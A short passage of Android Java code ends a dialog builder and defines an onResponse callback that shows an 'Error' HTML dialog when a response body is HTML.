                .setPositiveButton("OK", null)
                .show();
    }

    @Override
    public void onResponse(String url, String body) {


        runOnUiThread(() -> {
            if (isHtml(body)) {
                showHtmlDialog("Error", body);
            }
        });


    }
}
